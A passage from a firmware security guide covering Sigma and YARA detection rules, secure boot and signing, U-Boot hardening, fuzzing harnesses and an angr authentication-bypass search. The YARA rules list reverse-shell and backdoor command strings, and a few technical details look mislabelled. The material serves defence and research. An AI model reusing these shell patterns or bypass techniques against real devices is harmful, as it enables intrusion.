  selection_dangerous_commands:
    ATCommand|contains:
      - 'AT+CLAC'
      - 'AT+QLINUXCMD'
      - 'AT+CSIM'
      - 'AT+CRSM'
      - 'AT+CFUN=0'
      - 'AT+EGMR'
  selection_rapid_probing:
    ATCommand|startswith: 'AT+'
    count|gte: 50
    timeframe: '60s'
  filter_provisioning:
    ProcessName: 'ril_daemon'
    EventContext: 'provisioning'
  condition: (selection_dangerous_commands or selection_rapid_probing) and not filter_provisioning
falsepositives:
  - Carrier provisioning operations
  - Modem firmware update procedures
level: high
tags:
  - attack.collection
  - attack.t1021
```

Unauthorized boot environment modification detects tampering with U-Boot environment variables that control the boot process. Modifications to `bootcmd`, `bootargs`, or `verify` outside of an authorized firmware update workflow indicate an attacker is attempting to alter the boot chain.

```yaml
title: Unauthorized U-Boot Environment Modification
id: a7b8c9d0-e1f2-3456-abcd-567890123456
status: experimental
description: >
  Detects modifications to critical U-Boot environment variables
  (bootcmd, bootargs, verify) outside of authorized firmware update
  workflows. These modifications can redirect boot to attacker-controlled
  code or disable signature verification.
author: Renan Augusto Macena
date: 2025-06-01
references:
  - https://attack.mitre.org/techniques/T1542/001/
logsource:
  category: firmware
  product: embedded_linux
detection:
  selection:
    CommandLine|contains:
      - 'fw_setenv bootcmd'
      - 'fw_setenv bootargs'
      - 'fw_setenv verify'
      - 'fw_setenv ethaddr'
      - 'fw_setenv serverip'
  filter_update_service:
    ProcessName:
      - 'fwupdate_daemon'
      - 'ota_service'
    ParentProcessName: 'init'
  condition: selection and not filter_update_service
falsepositives:
  - Authorized firmware update services modifying boot environment
level: critical
tags:
  - attack.persistence
  - attack.t1542.001
```

CAN bus anomaly detection monitors for injection attacks on automotive networks. Frames with arbitration IDs that are not present in the vehicle's DBC specification, frames arriving at intervals inconsistent with the expected ECU transmission schedule, or bus-off error states that indicate a denial-of-service attack are all detectable.

```yaml
title: CAN Bus Frame Injection - Unknown Arbitration ID
id: b8c9d0e1-f2a3-4567-bcde-678901234567
status: experimental
description: >
  Detects CAN frames with arbitration IDs not present in the vehicle's
  DBC specification, indicating potential injection from an unauthorized
  node on the CAN bus.
author: Renan Augusto Macena
date: 2025-06-01
references:
  - https://attack.mitre.org/techniques/T0883/
logsource:
  category: automotive
  product: can_bus
detection:
  selection:
    EventType: 'can_frame'
  filter_known_ids:
    ArbitrationID|in:
      - '0x100-0x1FF'
      - '0x300-0x3FF'
      - '0x600-0x6FF'
      - '0x7DF-0x7EF'
  condition: selection and not filter_known_ids
falsepositives:
  - Aftermarket OBD-II devices sending non-standard IDs
  - New ECU added without DBC update
level: high
tags:
  - attack.lateral_movement
  - cve.t0883
```

### 8.3 YARA rules for malicious firmware modifications

YARA rules complement Sigma rules by operating on the firmware binary itself rather than on runtime event logs. These rules are applied during firmware acquisition (scanning a dumped image for known malicious patterns), during firmware update validation (scanning an incoming update image before flashing), and during fleet audits (scanning firmware images extracted from devices during scheduled maintenance).

Known malicious firmware modification patterns include embedded reverse shells, hardcoded C2 domains, backdoor authentication credentials, and trojanized system binaries. The following YARA rules detect these patterns in extracted firmware filesystems and raw flash dumps.

```
rule Firmware_Embedded_Backdoor_Shell
{
    meta:
        description = "Detects common reverse shell patterns embedded in firmware binaries"
        author = "Renan Augusto Macena"
        date = "2025-06-01"
        severity = "critical"
        reference = "Common IoT malware patterns"

    strings:
        $socket_connect = { 6A 02 6A 01 6A 02 B? ?? ?? ?? ?? }  // socket(AF_INET, SOCK_STREAM, 0) ARM
        $bash_reverse = "/bin/bash -i >& /dev/tcp/" ascii
        $nc_reverse = "nc -e /bin/sh" ascii
        $ncat_reverse = "ncat -e /bin/sh" ascii
        $python_reverse = "socket.socket(socket.AF_INET" ascii
        $perl_reverse = "use Socket;" ascii
        $lua_reverse = "socket.tcp()" ascii
        $busybox_nc = "busybox nc" ascii
        $telnetd_backdoor = "telnetd -l /bin/sh -p" ascii
        $socat_exec = "socat exec:" ascii

    condition:
        (uint32(0) == 0x464C457F or    // ELF magic
         uint32(0) == 0x27051956 or    // uImage magic
         uint16(0) == 0x8B1F)          // gzip magic
        and 2 of them
}

rule Firmware_Suspicious_ELF_Characteristics
{
    meta:
        description = "Identifies ELF binaries with suspicious characteristics in firmware filesystems: UPX packed, stripped with unusual sections, or statically linked with network functions"
        author = "Renan Augusto Macena"
        date = "2025-06-01"
        severity = "high"

    strings:
        $elf_magic = { 7F 45 4C 46 }
        $upx_magic = "UPX!" ascii
        $upx_header = { 55 50 58 21 }
        $anti_debug = "ptrace" ascii
        $proc_self = "/proc/self/exe" ascii
        $dev_null_redir = ">/dev/null 2>&1" ascii
        $system_call = "system" ascii
        $connect_str = "connect" ascii
        $inet_addr = "inet_addr" ascii
        $daemon_fork = { B? ?? ?? ?? ?? EB ?? ?? ?? ?? 2? 00 00 00 }  // fork() + check ARM

    condition:
        $elf_magic at 0
        and (
            $upx_magic or $upx_header or
            ($anti_debug and $proc_self) or
            ($system_call and $connect_str and $inet_addr and $dev_null_redir)
        )
}

rule Firmware_Bootloader_Modification_Indicator
{
    meta:
        description = "Detects indicators of bootloader modification: altered U-Boot environment, injected boot commands, or modified verified boot configuration"
        author = "Renan Augusto Macena"
        date = "2025-06-01"
        severity = "critical"

    strings:
        $uboot_env_magic = { 27 05 19 56 }  // U-Boot image magic
        $init_bin_sh = "init=/bin/sh" ascii
        $single_user = "single" ascii
        $verify_no = "verify=no" ascii
        $bootdelay_zero = "bootdelay=0" ascii nocase
        $console_null = "console=null" ascii
        $tftp_boot = "tftp" ascii
        $nfs_root = "nfsroot=" ascii
        $server_ip = "serverip=" ascii
        $attacker_bootcmd = "setenv bootcmd" ascii

    condition:
        ($uboot_env_magic at 0 or $uboot_env_magic)
        and (
            ($init_bin_sh and not $single_user) or
            $verify_no or
            ($console_null and $bootdelay_zero) or
            ($tftp_boot and $server_ip) or
            ($nfs_root and $server_ip)
        )
}

rule Firmware_Hardcoded_C2_Indicators
{
    meta:
        description = "Identifies hardcoded command-and-control indicators in firmware binaries: known IoT botnet domains, suspicious DNS resolution patterns, and encoded callback URLs"
        author = "Renan Augusto Macena"
        date = "2025-06-01"
        severity = "critical"

    strings:
        $dns_query_construct = { 08 ?? ?? ?? ?? ?? ?? ?? ?? 03 63 6F 6D 00 }  // DNS query structure ending .com
        $base64_http = "aHR0c" ascii   // base64("http")
        $base64_https = "aHR0cH" ascii  // base64("https")
        $xor_loop_arm = { 20 00 8? E? 01 ?0 ?0 E2 ?? 00 5? E1 }  // XOR decode loop ARM
        $dead_drop_resolve = "resolv" ascii
        $curl_wget = { 63 75 72 6C 20 }  // "curl "
        $wget_str = "wget " ascii
        $raw_socket = { 06 00 00 00 01 00 00 00 02 00 00 00 }  // socket(AF_INET, SOCK_STREAM, TCP)

    condition:
        uint32(0) == 0x464C457F  // ELF
        and 3 of them
}
```

### 8.4 Network-level detection of compromised embedded devices

When firmware-level instrumentation is not feasible (closed-source devices, legacy equipment without syslog, resource-constrained microcontrollers), network traffic analysis becomes the primary detection mechanism. Compromised embedded devices exhibit characteristic traffic patterns that differ from their normal operational profile.

DNS-based detection is particularly effective because IoT malware frequently uses DNS for C2 communication (DNS TXT record queries for command retrieval, subdomain encoding for data exfiltration). Monitoring DNS queries from embedded device subnets for anomalous patterns — queries to domains with high entropy labels, queries to newly registered domains (NRD), queries with unusually long subdomain strings, and queries at regular intervals (beaconing) — produces high-fidelity detection with low false-positive rates. The detection integrates with passive DNS monitoring infrastructure and threat intelligence feeds.

Traffic volume and connection pattern analysis identifies compromised devices that are scanning internal networks or participating in DDoS attacks. An IP camera that normally generates a steady upstream video feed to a single NVR server but suddenly begins making TCP SYN connections to thousands of IP addresses on port 23 (telnet) or port 5555 (ADB) is exhibiting Mirai-like scanning behavior. The baseline for each device type (expected connections, bandwidth, protocols, destination IPs) is established during a learning period and deviations trigger alerts.

TLS certificate fingerprinting (JA3/JA3S) identifies embedded devices that have had their TLS stack replaced or modified. Each device type produces a characteristic JA3 hash based on the TLS client hello parameters (cipher suites, extensions, elliptic curves). A change in the JA3 hash from a known device — without a corresponding firmware update — indicates that the TLS implementation has been modified, potentially by malware replacing the legitimate HTTPS client with one that connects to a C2 server.

### 8.5 Firmware update integrity monitoring

Monitoring the firmware update pipeline is a supply-chain defense that detects tampering between the build system and the device. The monitoring encompasses SBOM (Software Bill of Materials) validation, cryptographic signature verification, and version-consistency checking across the device fleet.

SBOM validation compares the components present in a firmware image against the declared SBOM. The SBOM (in SPDX or CycloneDX format) lists every software component, its version, and its license. The validation pipeline extracts the firmware, identifies all packages (by comparing file hashes against known package databases, parsing package manager metadata if present, and running binary identification tools), and flags any component not declared in the SBOM or present at a different version than declared.

```bash
# Firmware update integrity verification pipeline
# Step 1: Verify the cryptographic signature of the firmware image
openssl dgst -sha256 -verify vendor_pubkey.pem \
  -signature firmware_update.sig firmware_update.bin
# Expected output: "Verified OK"
# Any other output: REJECT the update, alert the SOC

# Step 2: Verify the image hash against the vendor's manifest
sha256sum firmware_update.bin
# Compare against the hash published in the signed manifest

# Step 3: Extract and enumerate components
binwalk -e firmware_update.bin
find _firmware_update.bin.extracted/squashfs-root/ -type f \
  -exec sha256sum {} \; > extracted_hashes.txt

# Step 4: Compare against the declared SBOM
# Using syft to generate a runtime SBOM from the extracted filesystem
syft dir:_firmware_update.bin.extracted/squashfs-root/ -o spdx-json \
  > runtime_sbom.json

# Step 5: Diff the declared SBOM against the runtime SBOM
# Components in the runtime SBOM but not in the declared SBOM are
# undeclared additions — potential supply-chain compromise indicators
```

Version-consistency checking across the device fleet identifies devices running firmware versions that differ from the expected version. A device management platform that tracks the firmware version of every managed device (via SNMP, TR-069, or a proprietary management protocol) can detect individual devices that have been reflashed with unauthorized firmware — their reported version will either differ from the fleet standard or, if the attacker has spoofed the version string, the hash of their firmware image will differ when remotely attested.

---

## 9. Firmware Hardening and Secure Development

### 9.1 Secure boot chain implementation

A secure boot chain establishes a hardware-rooted chain of trust from the first instruction executed after power-on through the bootloader, kernel, and userspace. Each stage verifies the integrity and authenticity of the next stage before transferring control, ensuring that no unauthorized code executes on the device. The chain begins at an immutable hardware root of trust — typically a ROM-based boot stage (BootROM) whose code is mask-programmed into the SoC and cannot be modified after fabrication.

The implementation layers are: (1) BootROM verifies the first-stage bootloader (BL1/SPL) using a public key whose hash is burned into OTP fuses — the BootROM reads the BL1 image from flash, computes its hash, verifies the RSA or ECDSA signature against the fused public key hash, and only transfers control if the signature is valid. (2) BL1 verifies BL2 (the second-stage bootloader, e.g., U-Boot proper or TF-A BL2) using a key embedded in BL1 or stored in a signed certificate chain. (3) BL2 verifies the kernel image (and optionally the device tree and initrd). (4) The kernel verifies the root filesystem integrity using dm-verity (a read-only hash tree over the filesystem blocks) or IMA/EVM (per-file signature verification).

The critical implementation details that determine whether a secure boot chain is actually secure or merely a compliance checkbox include: the public key storage mechanism (OTP fuses are secure; a key stored in writable flash that the attacker can replace is not), the revocation mechanism (how are compromised signing keys revoked — via an anti-rollback counter that prevents booting firmware signed with the old key, or is there no revocation at all), the debug interface lockdown (JTAG access bypasses the entire software chain of trust), and the error handling behavior (does a verification failure halt the boot or fall through to an unsigned boot path as a "recovery" mechanism — the latter is a backdoor).

### 9.2 Firmware signing infrastructure

Firmware signing requires an offline key management architecture where the code-signing private key never resides on an internet-connected system. The standard architecture uses an HSM (Hardware Security Module — FIPS 140-2 Level 3 or higher) to store the signing key and perform signing operations. The build system produces the unsigned firmware image, submits it to the signing service via an air-gapped transfer or a heavily restricted network path, the HSM signs the image, and the signed image is published for distribution.

```bash
# Generate an ECDSA P-256 signing key pair (do this on the HSM or
# an air-gapped signing station — NEVER on a build server)
openssl ecparam -genkey -name prime256v1 -out firmware_signing_key.pem
openssl ec -in firmware_signing_key.pem -pubout -out firmware_signing_pubkey.pem

# Sign a firmware image
openssl dgst -sha256 -sign firmware_signing_key.pem \
  -out firmware.sig firmware.bin

# Verification command (embedded in the bootloader or update agent)
openssl dgst -sha256 -verify firmware_signing_pubkey.pem \
  -signature firmware.sig firmware.bin

# For U-Boot verified boot using FIT images (Flattened Image Tree):
# Create a FIT image with embedded signatures
mkimage -f fit_image.its -k keys/ -K u-boot.dtb -r fit_image.itb
# The -K flag writes the public key into the U-Boot device tree
# The -r flag marks the key as "required" (signature verification is mandatory)
```

Key rotation is the operational challenge. When the signing key must be rotated (due to compromise, expiration, or policy), all devices in the field must accept firmware signed with the new key. The standard approach is dual-key verification during the transition period: the bootloader accepts firmware signed with either the old or new key, a firmware update signed with the old key installs the new public key into the device's trust store, and subsequent updates are signed with the new key only. Anti-rollback counters prevent downgrading to firmware versions that do not contain the new key.

### 9.3 Build reproducibility and SBOM generation

Reproducible firmware builds ensure that a given source tree and build configuration always produce a bit-identical output binary. Reproducibility is a security control because it allows independent verification: a third party (auditor, customer, security researcher) can rebuild the firmware from source and verify that the resulting binary matches the distributed image, confirming that no unauthorized modifications were inserted during the build process.

The primary obstacles to reproducible firmware builds are timestamps (embedded in compiled binaries, filesystem images, and archive headers), build paths (absolute paths baked into debug info and string tables), and non-deterministic ordering (parallel build systems may process files in different orders across runs). The mitigations are: setting `SOURCE_DATE_EPOCH` to a fixed value (the timestamp of the last commit), using relative paths in the build system, sorting file lists before processing, and stripping non-reproducible metadata from the output.

```bash
# Reproducible build environment setup
export SOURCE_DATE_EPOCH=$(git log -1 --format=%ct)
export TZ=UTC

# Build the firmware with deterministic settings
# (exact commands depend on the build system — Buildroot, Yocto, OpenWrt)

# For Buildroot:
make BR2_REPRODUCIBLE=y

# For OpenWrt:
make -j$(nproc) REPRODUCIBLE_BUILD=1

# SBOM generation using syft on the build output
syft dir:output/target/ -o spdx-json > firmware_sbom.spdx.json
syft dir:output/target/ -o cyclonedx-json > firmware_sbom.cdx.json

# Verify reproducibility: build twice and compare
sha256sum build1/firmware.bin build2/firmware.bin
# Hashes must match
diffoscope build1/firmware.bin build2/firmware.bin
# diffoscope provides detailed diff of any binary differences
```

### 9.4 Runtime integrity monitoring

Runtime integrity monitoring detects modifications to the firmware's filesystem and critical files after the device has booted. This catches attacks that exploit writable partitions, tmpfs-based payload staging, and runtime memory corruption that alters code pages.

**dm-verity** provides transparent block-level integrity verification for read-only filesystems. The kernel computes a hash for every block read from the filesystem and verifies it against a pre-computed hash tree. If a block has been modified (even a single bit flip), the read fails and the kernel returns an I/O error. dm-verity is used in Android (for the system partition) and Chrome OS (for the root filesystem), and is applicable to any embedded Linux system with a read-only rootfs.

```bash
# Create a dm-verity hash tree for a filesystem image
veritysetup format rootfs.img rootfs.hashtree
# Output: Root hash: <hex string>
# The root hash is embedded in the bootloader or kernel command line

# Kernel command line for dm-verity protected root:
# root=/dev/dm-0 dm-mod.create="vroot,,0,ro,0 <sectors> verity 1
#   /dev/mmcblk0p2 /dev/mmcblk0p3 4096 4096 <blocks> <blocks>
#   sha256 <root_hash> <salt>"

# Verify the hash tree offline
veritysetup verify rootfs.img rootfs.hashtree <root_hash>
```

**IMA (Integrity Measurement Architecture) and EVM (Extended Verification Module)** provide per-file integrity verification for Linux systems. IMA measures (hashes) and optionally appraises (verifies signatures on) every file before it is executed or memory-mapped. EVM extends this to file metadata (ownership, permissions, security labels). Together, they ensure that only signed executables run and that no file attributes have been tampered with.

```bash
# Enable IMA appraisal in the kernel command line
# ima_policy=appraise_tcb ima_appraise=enforce

# Sign all files in the rootfs with the IMA signing key
find /mnt/rootfs -type f -executable -exec \
  evmctl ima_sign --key /path/to/ima_privkey.pem {} \;

# Verify a file's IMA signature
evmctl ima_verify --key /path/to/ima_pubkey.pem /usr/bin/some_binary
```

### 9.5 Memory protection in embedded systems

Embedded systems running on microcontrollers (ARM Cortex-M, RISC-V) lack the MMU (Memory Management Unit) that provides virtual memory and page-level permissions on application processors. Instead, they use an MPU (Memory Protection Unit) that divides the address space into a fixed number of regions (typically 8 or 16 on Cortex-M) with configurable access permissions (read/write/execute for privileged and unprivileged modes) and memory attributes (cacheable, bufferable, shareable).

Configuring the MPU correctly is essential for limiting the impact of memory-corruption vulnerabilities. At minimum, the MPU configuration should enforce: code regions (flash) are read-execute but not writable (prevents code injection), data regions (SRAM) are read-write but not executable (prevents shellcode execution on the stack or heap), peripheral regions (MMIO registers) are device-type and accessible only from privileged mode (prevents unprivileged code from directly manipulating hardware), and the null-page region (address 0x0) is inaccessible (catches null-pointer dereferences).

```c
/* ARM Cortex-M MPU configuration example (CMSIS) */
#include "core_cm4.h"

void mpu_configure(void) {
    /* Disable MPU during configuration */
    ARM_MPU_Disable();

    /* Region 0: Flash (code) — read-only, executable */
    ARM_MPU_SetRegion(0,
        ARM_MPU_RBAR(0x08000000, 0),   /* Base: flash start */
        ARM_MPU_RASR(0, ARM_MPU_AP_RO, /* Read-only from privileged and unprivileged */
                     0, 0, 1, 1,        /* TEX=0, S=0, C=1, B=1 (write-back cache) */
                     0x00,              /* SRD: no sub-region disable */
                     ARM_MPU_REGION_SIZE_1MB));

    /* Region 1: SRAM (data) — read-write, NOT executable (XN=1) */
    ARM_MPU_SetRegion(1,
        ARM_MPU_RBAR(0x20000000, 1),   /* Base: SRAM start */
        ARM_MPU_RASR(1,                /* XN: Execute Never */
                     ARM_MPU_AP_FULL,  /* Full read-write access */
                     0, 0, 1, 1,
                     0x00,
                     ARM_MPU_REGION_SIZE_128KB));

    /* Region 2: Peripherals — device type, privileged only */
    ARM_MPU_SetRegion(2,
        ARM_MPU_RBAR(0x40000000, 2),
        ARM_MPU_RASR(1,                /* XN */
                     ARM_MPU_AP_PRIV,  /* Privileged access only */
                     0, 1, 0, 0,       /* TEX=0, S=1, C=0, B=0 (device) */
                     0x00,
                     ARM_MPU_REGION_SIZE_512MB));

    /* Region 3: Null page — no access (catches null derefs) */
    ARM_MPU_SetRegion(3,
        ARM_MPU_RBAR(0x00000000, 3),
        ARM_MPU_RASR(1,
                     ARM_MPU_AP_NONE,  /* No access */
                     0, 0, 0, 0,
                     0x00,
                     ARM_MPU_REGION_SIZE_256B));

    /* Enable MPU with default memory map for privileged access */
    ARM_MPU_Enable(MPU_CTRL_PRIVDEFENA_Msk);
}
```

Stack canaries on ARM Cortex-M require compiler support (`-fstack-protector-strong` in GCC) and a source of randomness for the canary value. On microcontrollers without a hardware RNG, the canary can be initialized from the SoC's unique ID register XORed with a boot counter or ADC noise — not ideal, but better than a fixed canary. When the canary is overwritten by a stack buffer overflow, the `__stack_chk_fail` handler is called, which should trigger a system reset (not just a log message, since there may be no logging infrastructure on a bare-metal system).

### 9.6 Secure OTA update architecture

Over-the-air (OTA) firmware updates are the primary mechanism for patching vulnerabilities in deployed embedded devices. A secure OTA architecture must address three threats: modification of the update in transit (solved by cryptographic signatures verified before flashing), rollback to a vulnerable version (solved by anti-rollback counters stored in monotonic storage — OTP fuses or RPMB), and bricking the device during an interrupted update (solved by A/B partitioning with atomic switchover).

A/B partitioning maintains two complete firmware slots (A and B). The device boots from the active slot. An OTA update writes the new firmware to the inactive slot, verifies its integrity, and atomically switches the boot pointer to the new slot. If the new firmware fails to boot (detected by a watchdog timer or a boot-success flag that the new firmware must set within a timeout), the bootloader reverts to the previous slot. This ensures that a failed or malicious update never leaves the device unbootable.

```bash
# A/B partition layout example (eMMC device with GPT)
# Partition table:
#   boot_a    — bootloader slot A
#   boot_b    — bootloader slot B
#   system_a  — rootfs slot A
#   system_b  — rootfs slot B
#   data      — persistent user data (not duplicated)
#   misc      — boot control metadata (active slot, boot attempts, success flag)

# Anti-rollback counter check in the update agent (pseudocode):
# current_counter = read_otp_counter()
# update_counter = parse_counter_from_signed_manifest(update_image)
# if update_counter < current_counter:
#     reject("Rollback detected: update counter %d < device counter %d")
# flash_update(update_image)
# increment_otp_counter(update_counter)

# SWUpdate (open-source OTA update agent for embedded Linux):
# Configuration for A/B update with signature verification
# /etc/swupdate.cfg:
# globals: {
#   verbose = true;
#   signing = "RSA_VERIFY";
#   public-key-file = "/etc/swupdate_pubkey.pem";
# };
```

Delta updates reduce bandwidth consumption by transmitting only the binary difference between the installed firmware and the new version. Tools like `bsdiff`/`bspatch` or `xdelta3` compute and apply binary patches. The security consideration is that the delta patch must be signed (not just the resulting full image), and the update agent must verify the patch signature before applying it and then verify the resulting full image hash after applying it — verifying only one is insufficient.

### 9.7 Hardening U-Boot

U-Boot is the most common bootloader for embedded Linux, and its default configuration prioritizes developer convenience over security. Production hardening requires disabling several features that are useful during development but dangerous in deployment.

Console access control: disable the autoboot interrupt by setting `bootdelay=-2` (which skips the delay entirely and cannot be interrupted by keypress — `bootdelay=0` still allows interruption with a precise keypress). Alternatively, configure the `CONFIG_AUTOBOOT_KEYED` option to require a specific password to interrupt autoboot.

Environment protection: the U-Boot environment is the most dangerous attack surface because modifying `bootcmd` controls what the device executes at boot. Lock the environment by setting `CONFIG_ENV_IS_NOWHERE` (environment is compiled into the binary, not stored on writable flash) or by write-protecting the environment partition with the SPI flash's Block Protect bits and asserting WP#. The `CONFIG_ENV_OVERWRITE` option controls which variables can be modified — restrict it to a whitelist.

Verified boot configuration: U-Boot's FIT (Flattened Image Tree) image format supports RSA and ECDSA signature verification. The public key is embedded in the U-Boot device tree blob and marked as "required" — if the key is required, U-Boot refuses to boot any image that does not have a valid signature.

```bash
# U-Boot hardening defconfig options
# These are set in the board's defconfig or applied via menuconfig

# Disable console interrupt during autoboot
CONFIG_AUTOBOOT_KEYED=y
CONFIG_AUTOBOOT_KEYED_CTRLC=n
CONFIG_AUTOBOOT_STOP_STR="s3cr3t_password"

# Set bootdelay to non-interruptible
CONFIG_BOOTDELAY=-2

# Enable verified boot (FIT image signature verification)
CONFIG_FIT=y
CONFIG_FIT_SIGNATURE=y
CONFIG_FIT_VERBOSE=y
CONFIG_RSA=y
CONFIG_IMAGE_FORMAT_LEGACY=n  # Disable legacy uImage format (unsigned)

# Disable dangerous commands in production
CONFIG_CMD_MEMORY=n       # md, mw, cp — memory read/write
CONFIG_CMD_LOADB=n        # Load binary via serial (XMODEM, YMODEM)
CONFIG_CMD_LOADS=n        # Load S-Record via serial
CONFIG_CMD_FLASH=n        # Direct flash manipulation
CONFIG_CMD_NAND=n         # Direct NAND access
CONFIG_CMD_USB=n          # USB device access
CONFIG_CMD_NET=n          # Network commands (tftp, dhcp)
CONFIG_CMD_SETENV=n       # Environment modification
```

### 9.8 Debug interface protection

Debug interfaces (JTAG, SWD, UART) are the most powerful attack vector against embedded devices because they bypass all software security controls. A comprehensive defense disables or restricts every debug interface on production devices.

JTAG/SWD lock fuses are the definitive control. ARM SoCs provide OTP fuse bits that permanently disable the JTAG/SWD interface. Once blown, the debug port cannot be re-enabled — the SoC ignores any signals on the JTAG/SWD pins. This is irreversible and prevents the manufacturer from debugging returned devices, so some vendors use ARM's Secure Debug architecture instead: the debug port remains physically present but requires a cryptographic challenge-response authentication before it activates. The authentication certificate is signed with a key held by the manufacturer, allowing authorized debugging while blocking unauthorized access.

UART protection in production firmware involves removing the serial console from the kernel command line (`console=` parameter), disabling the getty process on serial ports, and removing or password-protecting the U-Boot console. However, UART protection is a software control — an attacker with physical access can potentially bypass it by modifying the boot environment or the kernel command line. The hardware-level defense is to not route UART signals to test points on the production PCB (depopulate the UART header, remove the pull-up resistors on the TX/RX lines), though this complicates field debugging.

For devices that must support field debugging (medical devices, industrial controllers, automotive ECUs), a tiered authentication model is appropriate: Level 0 (unauthenticated) provides only device identification and status information; Level 1 (technician authentication via a time-limited token from the manufacturer's portal) provides read-only diagnostic access; Level 2 (engineering authentication via a hardware security token) provides full debug access including memory reads and JTAG. Each level is gated by cryptographic authentication, and the tokens are logged by the manufacturer's backend for audit purposes.

---

## 10. Advanced Firmware Vulnerability Research

### 10.1 Firmware fuzzing with QEMU and AFL

Fuzzing firmware binaries requires emulating the target architecture because the firmware is compiled for ARM, MIPS, or other non-x86 architectures. The combination of AFL (American Fuzzy Lop) with QEMU user-mode emulation provides an effective fuzzing pipeline for firmware binaries extracted from embedded devices. The approach treats individual binaries (web servers, CGI handlers, protocol parsers) as fuzz targets, feeding mutated input through their stdin, file, or network interfaces.

The fuzzing harness construction begins with identifying the target binary and its input interface. For a CGI handler that parses HTTP POST data from stdin (the most common interface for web-based vulnerabilities in consumer routers), the AFL harness is straightforward: AFL provides the mutated input via stdin, and the CGI binary processes it under QEMU emulation.

```bash
# Set up the fuzzing environment for an ARM CGI binary
# extracted from router firmware

# Install AFL with QEMU support
git clone https://github.com/AFLplusplus/AFLplusplus.git
cd AFLplusplus
make
cd qemu_mode
./build_qemu_support.sh
cd ../..

# Create the fuzzing workspace
mkdir -p fuzzing/{input,output}

# Seed the input corpus with a valid HTTP POST body
echo -n "action=login&user=admin&pass=admin" > fuzzing/input/seed1.txt
echo -n "action=set_wifi&ssid=test&key=12345678" > fuzzing/input/seed2.txt

# Set environment variables for the CGI binary
export REQUEST_METHOD=POST
export CONTENT_TYPE="application/x-www-form-urlencoded"
export CONTENT_LENGTH=@@

# Run AFL with QEMU emulation (ARM)
# The -Q flag enables QEMU mode
# chroot into the extracted rootfs for library resolution
sudo chroot /path/to/squashfs-root/ \
  /usr/bin/afl-fuzz -Q -i fuzzing/input -o fuzzing/output \
  -m 256 -- /usr/bin/target_cgi
```

For bare-metal firmware (firmware that does not run on an OS and accesses hardware directly), Unicorn-based fuzzing harnesses provide finer control. Unicorn is a CPU emulator based on QEMU that exposes an API for mapping memory, hooking code execution, and injecting input at arbitrary points in the execution. The analyst identifies the parsing function in Ghidra, determines its input buffer address and length parameter, and writes a Python harness that maps the firmware into Unicorn's address space, sets up the stack and registers, places the fuzz input at the expected buffer address, and runs the target function.

```python
#!/usr/bin/env python3
"""Unicorn-based fuzzing harness for a bare-metal firmware parser."""
from unicorn import *
from unicorn.arm_const import *
import struct
import sys

# Firmware analysis results from Ghidra:
FIRMWARE_BASE = 0x08000000
FIRMWARE_SIZE = 0x00100000   # 1 MB
STACK_BASE    = 0x20010000
STACK_SIZE    = 0x00004000   # 16 KB
INPUT_BUFFER  = 0x20020000
# Target function: parse_config_packet at firmware offset 0x0000A340
PARSE_FUNC    = FIRMWARE_BASE + 0x0000A340
# Return address for the function (we hook this to stop emulation)
RETURN_ADDR   = 0xDEADBEEF

def fuzz_one(data):
    mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)

    # Map firmware flash region
    mu.mem_map(FIRMWARE_BASE, FIRMWARE_SIZE)
    firmware = open("firmware.bin", "rb").read()
    mu.mem_write(FIRMWARE_BASE, firmware)

    # Map stack
    mu.mem_map(STACK_BASE - STACK_SIZE, STACK_SIZE)
    mu.reg_write(UC_ARM_REG_SP, STACK_BASE)

    # Map input buffer and write fuzz data
    mu.mem_map(INPUT_BUFFER, 0x1000)
    mu.mem_write(INPUT_BUFFER, data)

    # Set function arguments: R0 = buffer pointer, R1 = length
    mu.reg_write(UC_ARM_REG_R0, INPUT_BUFFER)
    mu.reg_write(UC_ARM_REG_R1, len(data))
    mu.reg_write(UC_ARM_REG_LR, RETURN_ADDR)

    # Map a page for the return address (to catch clean returns)
    mu.mem_map(RETURN_ADDR & 0xFFFFF000, 0x1000)

    try:
        mu.emu_start(PARSE_FUNC | 1, RETURN_ADDR, timeout=5000000)
    except UcError as e:
        if e.errno == UC_ERR_FETCH_UNMAPPED:
            # Crash — unmapped fetch indicates control-flow hijack
            print(f"CRASH: Unmapped fetch at PC=0x{mu.reg_read(UC_ARM_REG_PC):08X}")
            return True
        elif e.errno == UC_ERR_WRITE_UNMAPPED:
            print(f"CRASH: Unmapped write")
            return True
    return False

if __name__ == "__main__":
    data = sys.stdin.buffer.read()
    if fuzz_one(data):
        sys.exit(1)  # Signal crash to AFL
    sys.exit(0)
```

### 10.2 Symbolic execution for firmware with angr

Symbolic execution explores multiple execution paths simultaneously by treating input as symbolic variables rather than concrete values. The angr framework supports ARM, MIPS, and other architectures, making it applicable to firmware analysis. The analyst uses angr to find paths that reach specific program states — a successful authentication bypass, a buffer overflow condition, or a code path that should be unreachable.

For firmware binaries, angr requires a custom loader because bare-metal firmware does not use standard ELF or PE loading conventions. The analyst specifies the base address, entry point, and memory layout manually based on Ghidra analysis.

```python
#!/usr/bin/env python3
"""angr-based path exploration for a firmware authentication bypass."""
import angr
import claripy

# Load the firmware binary with a custom base address
proj = angr.Project(
    "firmware.bin",
    main_opts={
        'backend': 'blob',
        'arch': 'ARMEL',
        'base_addr': 0x08000000,
        'entry_point': 0x08000000,
    },
    auto_load_libs=False,
)

# Target: find a path from the authentication check function
# to the "authenticated" state without knowing the password.
# Addresses from Ghidra analysis:
AUTH_CHECK_FUNC = 0x0800B200   # Start of auth_check()
AUTH_SUCCESS    = 0x0800B340   # "Authentication successful" branch
AUTH_FAILURE    = 0x0800B380   # "Authentication failed" branch

# Create a symbolic input (password buffer, 32 bytes)
password = claripy.BVS("password", 32 * 8)

# Set up the initial state at the authentication function entry
state = proj.factory.blank_state(addr=AUTH_CHECK_FUNC)

# Place the symbolic password at the address where the function
# reads its input (determined from Ghidra analysis)
PASSWORD_BUFFER = 0x20001000
state.memory.store(PASSWORD_BUFFER, password)
state.regs.r0 = PASSWORD_BUFFER  # First argument = password pointer
state.regs.r1 = 32               # Second argument = password length

# Create the simulation manager and explore
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=AUTH_SUCCESS, avoid=AUTH_FAILURE)

if simgr.found:
    found_state = simgr.found[0]
    solution = found_state.solver.eval(password, cast_to=bytes)
    print(f"Found password: {solution}")
else:
    print("No path to AUTH_SUCCESS found.")
```

